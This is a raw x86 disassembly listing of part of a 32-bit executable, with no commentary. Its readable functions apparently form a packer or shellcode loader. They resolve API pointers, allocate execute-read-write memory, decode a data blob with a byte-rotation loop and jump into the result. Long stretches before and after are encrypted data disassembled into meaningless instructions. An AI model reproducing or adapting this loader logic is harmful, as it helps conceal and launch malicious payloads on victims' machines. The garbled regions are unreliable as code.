  42140f:	jno    0x421416
  421411:	shl    BYTE PTR [edx-0x74],0x21
  421415:	push   esp
  421416:	leave  
  421417:	add    DWORD PTR [ecx-0x7ad7bb57],0x8a1d880d
  421421:	mov    al,ds:0xb17fb515
  421426:	jge    0x421419
  421428:	shr    ebx,1
  42142a:	out    0x42,al
  42142c:	adc    al,0xb0
  42142e:	hlt    
  42142f:	lea    ecx,[ebx-0x2b]
  421432:	lds    esi,FWORD PTR [ecx]
  421434:	rcr    DWORD PTR [edx+eiz*1],1
  421437:	adc    BYTE PTR ds:[edx+0x625275bf],0x4d
  42143f:	cmp    al,0xc2
  421441:	cmc    
  421442:	test   DWORD PTR [ecx],ebx
  421444:	icebp  
  421445:	jns    0x4213cd
  421447:	outs   dx,BYTE PTR ds:[esi]
  421448:	(bad)  
  421449:	int    0xb3
  42144b:	jg     0x42143b
  42144d:	jl     0x4213d7
  42144f:	imul   ebx,DWORD PTR [edx+0x6fe3aa9b],0x90aaec4d
  421459:	in     al,dx
  42145a:	dec    esi
  42145b:	loop   0x421417
  42145d:	pop    esi
  42145e:	jb     0x4214d3
  421460:	xor    al,0x56
  421462:	ror    BYTE PTR [edi+edx*8+0xd],0x9e
  421467:	xlat   BYTE PTR ds:[ebx]
  421468:	stc    
  421469:	mov    ds:0x54e481c,al
  42146e:	push   0xd848afa8
  421473:	test   eax,0x5d41955f
  421478:	std    
  421479:	adc    esi,DWORD PTR [eax]
  42147b:	inc    esp
  42147c:	test   eax,0x7b8f3600
  421481:	lods   al,BYTE PTR ds:[esi]
  421482:	mov    bh,dl
  421484:	fistp  DWORD PTR [esi-0x41c8a02]
  42148a:	outs   dx,DWORD PTR ds:[esi]
  42148b:	lahf   
  42148c:	std    
  42148d:	inc    edi
  42148e:	jg     0x42147f
  421490:	lock sahf 
  421492:	xor    DWORD PTR [edx+0x52c41c8e],eax
  421498:	xor    dh,0xee
  42149b:	add    edx,edx
  42149d:	ja     0x4214eb
  42149f:	xchg   ecx,eax
  4214a0:	sub    eax,0xcc5cd1c7
  4214a5:	or     edx,0x70
  4214a8:	ret    
  4214a9:	sbb    al,0xba
  4214ab:	push   ss
  4214ac:	int    0x78
  4214ae:	mov    ds:0x65023922,eax
  4214b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214b4:	or     eax,DWORD PTR [ebx-0x4da03765]
  4214ba:	imul   eax,DWORD PTR ds:0x55cb8176,0x18
  4214c1:	push   esp
  4214c2:	xchg   edi,eax
  4214c3:	xchg   esi,eax
  4214c4:	inc    edx
  4214c5:	sub    al,0xa4
  4214c7:	mov    dl,0x86
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x3fb9a1fc
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x84c4d70e
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	push   DWORD PTR ds:0x621ea783
  421833:	sar    BYTE PTR [edx+0x3],0xb6
  421837:	xlat   BYTE PTR ds:[ebx]
  421838:	jle    0x421890
  42183a:	inc    esp
  42183b:	xchg   ecx,ebx
  42183d:	aaa    
  42183e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42183f:	popa   
  421840:	sar    BYTE PTR [edx+0x3],0xb2
  421844:	xlat   BYTE PTR ds:[ebx]
  421845:	jle    0x42185d
  421847:	mov    ebx,0x1e37d978
  42184c:	popa   
  42184d:	sar    BYTE PTR [edx+0x3],0xb2
  421851:	xlat   BYTE PTR ds:[ebx]
  421852:	jle    0x4218aa
  421854:	mov    ebx,0x1e37d978
  421859:	popa   
  42185a:	sar    BYTE PTR [edx+0x3],0xb2
  42185e:	xlat   BYTE PTR ds:[ebx]
  42185f:	jle    0x4218b7
  421861:	mov    ebx,0x1e37d978
  421866:	popa   
  421867:	sar    BYTE PTR [edx+0x3],0x4a
  42186b:	xlat   BYTE PTR ds:[ebx]
  42186c:	jle    0x4218c4
  42186e:	mov    ch,0x67
  421870:	arpl   WORD PTR [ecx],di
  421872:	push   ds
  421873:	aad    0xc9
  421875:	mov    bh,0x22
  421877:	or     dl,dh
  421879:	xor    bl,BYTE PTR [ebx+0x5eb12c9a]
  42187f:	ins    DWORD PTR es:[edi],dx
  421880:	inc    ecx
  421881:	mov    al,0x8
  421883:	ins    BYTE PTR es:[edi],dx
  421884:	aad    0xa5
  421886:	pop    ds
  421887:	cmp    ebx,DWORD PTR [ebx+0x7059b81b]
  42188d:	push   cs
  42188e:	mov    ah,0x5a
  421890:	popa   
  421891:	xlat   BYTE PTR ds:[ebx]
  421892:	test   DWORD PTR [ebx+eiz*1],0x59b058d5
  421899:	ds and eax,0xdf23298f
  42189f:	mov    eax,0x7595331a
  4218a4:	aam    0x3d
  4218a6:	cmp    ah,BYTE PTR [ecx-0x40]
  4218a9:	jp     0x4218ae
  4218ab:	mov    dl,0xd7
  4218ad:	jle    0x421900
  4218af:	and    al,BYTE PTR [eax+eax*4-0x350c198c]
  4218b6:	cmp    ebx,edi
  4218b8:	and    ch,bl
  4218ba:	cmp    eax,0x817229ae
  4218bf:	push   edx
  4218c0:	adc    ch,BYTE PTR [ebx-0x61]
  4218c3:	adc    BYTE PTR [ecx+0x6e1b8fb8],0xb1
  4218ca:	mov    edx,0x3914a521
  4218cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d0:	inc    ebx
  4218d1:	or     edx,ebx
  4218d3:	das    
  4218d4:	in     al,dx
  4218d5:	pop    esp
  4218d6:	xchg   edi,eax
  4218d7:	mul    al
  4218d9:	cmp    eax,0x70529958
  4218de:	dec    ecx
  4218df:	xor    al,dh
  4218e1:	je     0x4218ff
  4218e3:	inc    ebx
  4218e4:	jmp    0x22ca:0x609e7dd3
  4218eb:	sti    
  4218ec:	and    ch,bl
  4218ee:	cmp    eax,0xf17228ae
  4218f3:	into   
  4218f4:	mov    WORD PTR [ebx+0x7f],gs
  4218f7:	mov    ds:0x869ab883,al
  4218fc:	les    esi,FWORD PTR [ecx+0x140abc20]
  421902:	imul   edi,DWORD PTR [eax],0xb2ea09e8
  421908:	jbe    0x421966
  42190a:	stc    
  42190b:	or     BYTE PTR [ebx+0x3d],0x46
  42190f:	add    al,0xcf
  421911:	jo     0x421954
  421913:	dec    edx
  421914:	inc    ebp
  421915:	je     0x42191b
  421917:	rcr    BYTE PTR [ebx],cl
  421919:	mov    cl,0x74
  42191b:	out    0xf3,al
  42191d:	retf   0x37a
  421920:	mov    dl,0xd7
  421922:	jle    0x42197a
  421924:	mov    ebx,0x1e728978
  421929:	popa   
  42192a:	mov    WORD PTR [ebx+0x1],?
  42192d:	mov    dl,0x77
  42192f:	scas   al,BYTE PTR es:[edi]
  421930:	cmp    eax,0x37d978f4
  421935:	push   ds
  421936:	popa   
  421937:	sar    BYTE PTR [edx+0x3],0x52
  42193b:	xlat   BYTE PTR ds:[ebx]
  42193c:	jge    0x421995
  42193e:	mov    al,0x79
  421940:	shl    DWORD PTR [edi],cl
  421942:	push   ds
  421943:	pop    esp
  421945:	jp     0x42194a
  421947:	push   cs
  421948:	sar    DWORD PTR [esi+0x56],1
  42194b:	mov    ebx,0xa326d978
  421950:	popa   
  421951:	sar    BYTE PTR [edx+0x13],0xb2
  421955:	xlat   BYTE PTR ds:[ebx]
  421956:	jle    0x4219ae
  421958:	mov    esi,0x5f37d978
  42195d:	popa   
  42195e:	shr    BYTE PTR [edx+0x3],0xb2
  421962:	xlat   BYTE PTR ds:[ebx]
  421963:	jl     0x4219bb
  421965:	mov    ebx,0x1e36d97d
  42196a:	popa   
  42196b:	sar    BYTE PTR [edx+0x3],0xb7
  42196f:	xlat   BYTE PTR ds:[ebx]
  421970:	jg     0x4219c8
  421972:	mov    ebx,0x1e37d978
  421977:	xor    esp,ecx
  421979:	jp     0x42197e
  42197b:	mov    dh,0xd7
  42197d:	jle    0x4219d6
  42197f:	pop    edi
  421980:	jge    0x42195b
  421982:	xor    eax,0x7a40611e
  421987:	add    esp,DWORD PTR [edx-0x44b98129]
  42198d:	js     0x421968
  42198f:	aaa    
  421990:	push   cs
  421991:	popa   
  421992:	shr    BYTE PTR [edx+0x3],0xb2
  421996:	xlat   BYTE PTR ds:[ebx]
  421997:	jle    0x4219ef
  421999:	mov    ebx,0x1e37d968
  42199e:	popa   
  42199f:	sar    BYTE PTR [edx+0x3],0xb2
  4219a3:	xlat   BYTE PTR ds:[ebx]
  4219a4:	jle    0x4219fc
  4219a6:	dec    edi
  4219a7:	inc    ecx
  4219a8:	aad    0x37
  4219aa:	ja     0x421a0e
  4219ac:	sar    BYTE PTR [edx+0x3],0x42
  4219b0:	fdivr  QWORD PTR [esi+0x19]
  4219b3:	bnd js 0x42198f
  4219b6:	aaa    
  4219b7:	push   ds
  4219b8:	popa   
  4219b9:	sar    BYTE PTR [edx+0x3],0xb2
  4219bd:	xlat   BYTE PTR ds:[ebx]
  4219be:	jle    0x421a16
  4219c0:	mov    ebx,0x1e37d978
  4219c5:	popa   
  4219c6:	sar    BYTE PTR [edx+0x3],0xb2
  4219ca:	xlat   BYTE PTR ds:[ebx]
  4219cb:	jle    0x421a23
  4219cd:	mov    ebx,0x1e37d978
  4219d2:	popa   
  4219d3:	sar    BYTE PTR [edx+0x3],0xb2
  4219d7:	xlat   BYTE PTR ds:[ebx]
  4219d8:	jle    0x421a30
  4219da:	mov    ebx,0x1e37d978
  4219df:	popa   
  4219e0:	sar    BYTE PTR [edx+0x3],0xb2
  4219e4:	xlat   BYTE PTR ds:[ebx]
  4219e5:	jle    0x421a3d
  4219e7:	mov    ebx,0x1e37d978
  4219ec:	popa   
  4219ed:	sar    BYTE PTR [edx+0x3],0xb2
  4219f1:	xlat   BYTE PTR ds:[ebx]
  4219f2:	jle    0x421a4a
  4219f4:	mov    ebx,0x1e37d978
  4219f9:	popa   
  4219fa:	sar    BYTE PTR [edx+0x3],0xb2
  4219fe:	xlat   BYTE PTR ds:[ebx]
  4219ff:	jle    0x421a57
  421a01:	mov    ebx,0x1e37d978
  421a06:	popa   
  421a07:	sar    BYTE PTR [edx+0x3],0xb2
  421a0b:	xlat   BYTE PTR ds:[ebx]
  421a0c:	jle    0x421a64
  421a0e:	mov    ebx,0x1e37d978
  421a13:	popa   
  421a14:	sar    BYTE PTR [edx+0x3],0xb2
  421a18:	xlat   BYTE PTR ds:[ebx]
  421a19:	jle    0x421a71
  421a1b:	mov    ebx,0x6a19d978
  421a20:	add    al,0xb8
  421a22:	push   cs
  421a23:	add    esi,DWORD PTR [edx-0x4f498129]
  421a29:	js     0x421a04
  421a2b:	daa    
  421a2c:	push   ds
  421a2d:	popa   
  421a2e:	shr    BYTE PTR [esi+0x7ad7b207],0x56
  421a35:	mov    ebx,0x2c749c28
  421a3a:	xor    eax,0xb2037a8f
  421a3f:	xlat   BYTE PTR ds:[ebx]
  421a40:	jle    0x421a98
  421a42:	fwait
  421a43:	js     0x421a1e
  421a45:	xlat   BYTE PTR ds:[ebx]
  421a46:	xor    BYTE PTR [ebx],dl
  421a48:	mov    bl,0x8
  421a4a:	pusha  
  421a4b:	mov    dl,0xd7
  421a4d:	jle    0x421aa5
  421a4f:	fstp   TBYTE PTR [eax-0x27]
  421a52:	aaa    
  421a53:	out    dx,al
  421a54:	push   0xffffffc0
  421a56:	jp     0x421ab1
  421a58:	mov    dl,0xd7
  421a5a:	jle    0x4219ea
  421a5c:	mov    edi,0x1e37d978
  421a61:	popa   
  421a62:	sar    BYTE PTR [edx+0x3],0xb2
  421a66:	xlat   BYTE PTR ds:[ebx]
  421a67:	jle    0x421abf
  421a69:	mov    ebx,0xfe37d958
  421a6e:	popa   
  421a6f:	sar    BYTE PTR [edx+0x3],0xb2
  421a73:	xlat   BYTE PTR ds:[ebx]
  421a74:	jle    0x421acc
  421a76:	mov    ebx,0x1e37d978
  421a7b:	popa   
  421a7c:	sar    BYTE PTR [edx+0x3],0xb2
  421a80:	xlat   BYTE PTR ds:[ebx]
  421a81:	jle    0x421ad9
  421a83:	mov    ebx,0x1e37d978
  421a88:	popa   
  421a89:	sar    BYTE PTR [edx+0x3],0xb2
  421a8d:	xlat   BYTE PTR ds:[ebx]
  421a8e:	jle    0x421ae6
  421a90:	mov    ebx,0x1e37d978
  421a95:	popa   
  421a96:	sar    BYTE PTR [edx+0x3],0xb2
  421a9a:	xlat   BYTE PTR ds:[ebx]
  421a9b:	jle    0x421af3
  421a9d:	mov    ebx,0x1e37d978
  421aa2:	popa   
  421aa3:	sar    BYTE PTR [edx+0x3],0xb2
  421aa7:	xlat   BYTE PTR ds:[ebx]
  421aa8:	jle    0x421b00
  421aaa:	mov    ebx,0x1e37d978
  421aaf:	popa   
  421ab0:	sar    BYTE PTR [edx+0x3],0xb2
  421ab4:	xlat   BYTE PTR ds:[ebx]
  421ab5:	jle    0x421b0d
  421ab7:	mov    ebx,0x1e37d978
  421abc:	popa   
  421abd:	sar    BYTE PTR [edx+0x3],0xb2
  421ac1:	xlat   BYTE PTR ds:[ebx]
  421ac2:	jle    0x421b1a
  421ac4:	mov    ebx,0x1e37d978
  421ac9:	popa   
  421aca:	sar    BYTE PTR [edx+0x3],0xb2
  421ace:	xlat   BYTE PTR ds:[ebx]
  421acf:	jle    0x421b27
  421ad1:	mov    ebx,0x1e37d978
  421ad6:	popa   
  421ad7:	sar    BYTE PTR [edx+0x3],0xb2
  421adb:	xlat   BYTE PTR ds:[ebx]
  421adc:	jle    0x421b34
  421ade:	mov    ebx,0x1e37d978
  421ae3:	popa   
  421ae4:	sar    BYTE PTR [edx+0x3],0xb2
  421ae8:	xlat   BYTE PTR ds:[ebx]
  421ae9:	jle    0x421b41
  421aeb:	mov    ebx,0x1e37d978
  421af0:	popa   
  421af1:	sar    BYTE PTR [edx+0x3],0xb2
  421af5:	xlat   BYTE PTR ds:[ebx]
  421af6:	jle    0x421b4e
  421af8:	mov    ebx,0x1e37d978
  421afd:	popa   
  421afe:	sar    BYTE PTR [edx+0x3],0xb2
  421b02:	xlat   BYTE PTR ds:[ebx]
  421b03:	jle    0x421b5b
  421b05:	mov    ebx,0x1e37d978
  421b0a:	popa   
  421b0b:	sar    BYTE PTR [edx+0x3],0xb2
  421b0f:	xlat   BYTE PTR ds:[ebx]
  421b10:	jle    0x421b68
  421b12:	mov    ebx,0x1e37d978
  421b17:	popa   
  421b18:	sar    BYTE PTR [edx+0x3],0xb2
  421b1c:	xlat   BYTE PTR ds:[ebx]
  421b1d:	jle    0x421b75
  421b1f:	mov    ebx,0x1e37d978
  421b24:	popa   
  421b25:	sar    BYTE PTR [edx+0x3],0xb2
  421b29:	xlat   BYTE PTR ds:[ebx]
  421b2a:	jle    0x421b82
  421b2c:	mov    ebx,0x1e37d978
  421b31:	popa   
  421b32:	sar    BYTE PTR [edx+0x3],0xb2
  421b36:	xlat   BYTE PTR ds:[ebx]
  421b37:	jle    0x421b8f
  421b39:	mov    ebx,0x1e37d978
  421b3e:	popa   
  421b3f:	sar    BYTE PTR [edx+0x3],0xb2
  421b43:	xlat   BYTE PTR ds:[ebx]
  421b44:	jle    0x421b9c
  421b46:	mov    ebx,0x1e37d978
  421b4b:	popa   
  421b4c:	sar    BYTE PTR [edx+0x3],0xb2
  421b50:	xlat   BYTE PTR ds:[ebx]
  421b51:	jle    0x421ba9
  421b53:	mov    ebx,0x1e37d978
  421b58:	popa   
  421b59:	sar    BYTE PTR [edx+0x3],0xb2
  421b5d:	xlat   BYTE PTR ds:[ebx]
  421b5e:	jle    0x421bb6
  421b60:	mov    ebx,0x1e37d978
  421b65:	popa   
  421b66:	sar    BYTE PTR [edx+0x3],0xb2
  421b6a:	xlat   BYTE PTR ds:[ebx]
  421b6b:	jle    0x421bc3
  421b6d:	mov    ebx,0x1e37d978
  421b72:	popa   
  421b73:	sar    BYTE PTR [edx+0x3],0xb2
  421b77:	xlat   BYTE PTR ds:[ebx]
  421b78:	jle    0x421bd0
  421b7a:	mov    ebx,0x1e37d978
  421b7f:	popa   
  421b80:	sar    BYTE PTR [edx+0x3],0xb2
  421b84:	xlat   BYTE PTR ds:[ebx]
  421b85:	jle    0x421bdd
  421b87:	mov    ebx,0x1e37d978
  421b8c:	popa   
  421b8d:	sar    BYTE PTR [edx+0x3],0xb2
  421b91:	xlat   BYTE PTR ds:[ebx]
  421b92:	jle    0x421bea
  421b94:	mov    ebx,0x1e37d978
  421b99:	popa   
  421b9a:	sar    BYTE PTR [edx+0x3],0xb2
  421b9e:	xlat   BYTE PTR ds:[ebx]
  421b9f:	jle    0x421bf7
  421ba1:	mov    ebx,0x1e37d978
  421ba6:	popa   
  421ba7:	sar    BYTE PTR [edx+0x3],0xb2
  421bab:	xlat   BYTE PTR ds:[ebx]
  421bac:	jle    0x421c04
  421bae:	mov    ebx,0x1e37d978
  421bb3:	popa   
  421bb4:	sar    BYTE PTR [edx+0x3],0xb2
  421bb8:	xlat   BYTE PTR ds:[ebx]
  421bb9:	jle    0x421c11
  421bbb:	mov    ebx,0x1e37d978
  421bc0:	popa   
  421bc1:	sar    BYTE PTR [edx+0x3],0xb2
  421bc5:	xlat   BYTE PTR ds:[ebx]
  421bc6:	jle    0x421c1e
  421bc8:	mov    ebx,0x1e37d978
  421bcd:	popa   
  421bce:	sar    BYTE PTR [edx+0x3],0xb2
  421bd2:	xlat   BYTE PTR ds:[ebx]
  421bd3:	jle    0x421c2b
  421bd5:	mov    ebx,0x1e37d978
  421bda:	popa   
  421bdb:	sar    BYTE PTR [edx+0x3],0xb2
  421bdf:	xlat   BYTE PTR ds:[ebx]
  421be0:	jle    0x421c38
  421be2:	mov    ebx,0x1e37d978
  421be7:	popa   
  421be8:	sar    BYTE PTR [edx+0x3],0xb2
  421bec:	xlat   BYTE PTR ds:[ebx]
  421bed:	jle    0x421c45
  421bef:	mov    ebx,0x1e37d978
  421bf4:	popa   
  421bf5:	sar    BYTE PTR [edx+0x3],0xb2
  421bf9:	xlat   BYTE PTR ds:[ebx]
  421bfa:	jle    0x421c52
  421bfc:	mov    ebx,0x1e37d978
  421c01:	popa   
  421c02:	sar    BYTE PTR [edx+0x3],0xb2
  421c06:	xlat   BYTE PTR ds:[ebx]
  421c07:	jle    0x421c5f
  421c09:	mov    ebx,0x1e37d978
  421c0e:	popa   
  421c0f:	sar    BYTE PTR [edx+0x3],0xb2
  421c13:	xlat   BYTE PTR ds:[ebx]
  421c14:	jle    0x421c6c
  421c16:	mov    ebx,0x1e37d978
  421c1b:	popa   
  421c1c:	sar    BYTE PTR [edx+0x3],0xb2
  421c20:	xlat   BYTE PTR ds:[ebx]
  421c21:	jle    0x421c79
  421c23:	mov    ebx,0x1e37d978
  421c28:	popa   
  421c29:	sar    BYTE PTR [edx+0x3],0xb2
  421c2d:	xlat   BYTE PTR ds:[ebx]
  421c2e:	adc    esi,edi
  421c30:	mov    al,0x78
  421c32:	div    BYTE PTR [edi]
  421c34:	push   ds
  421c35:	jno    0x421bf7
  421c37:	jp     0x421c62
  421c39:	adc    BYTE PTR ds:0x5544300f,cl
  421c3f:	inc    edi
  421c40:	mov    al,0x4e
